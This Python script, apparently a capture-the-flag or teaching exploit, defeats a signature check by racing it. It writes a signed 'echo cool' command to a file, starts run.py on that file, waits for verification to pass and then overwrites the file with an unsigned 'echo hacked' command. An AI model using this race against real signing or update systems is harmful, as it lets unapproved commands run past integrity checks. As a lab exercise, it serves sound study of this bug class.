import time
import subprocess
import sys


def generate_preteneder() -> str:
    r = """{"command": "echo cool", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}"""
    return r


def generate_exploit() -> str:
    r = """{"command": "echo hacked", "signature": "6c68e3c88a87339fa8667cb36c82d4cf0bdcc131efcf98eb8df1867122e66e0e2e9d8d1ce01c40261fb8bde61a7768215c20febc2cd522af3a2232be73cabe3ada6d86b1635a52c787bd7d97985f4ce2ef9b47ea0c72bdb35b702f9169218adc2d4cd53eabfc3c875bef05270b703d407afb5b22198d56f3489ec8e3241c19a9"}"""
    return r


def main(argv):
    script = generate_preteneder()
    with open('foo.json', 'w') as writer:
        writer.write(script)

    p = subprocess.Popen(['python3', 'run.py', 'foo.json'])

    script = generate_exploit()
    time.sleep(2) # wait for the data to be tranfered to verify() by run.py
    with open('foo.json', 'w') as writer:
        writer.seek(0) # rewrite foo.json
        writer.write(script)

    p.wait()


if __name__ == '__main__':
    import sys
    sys.exit(main(sys.argv))
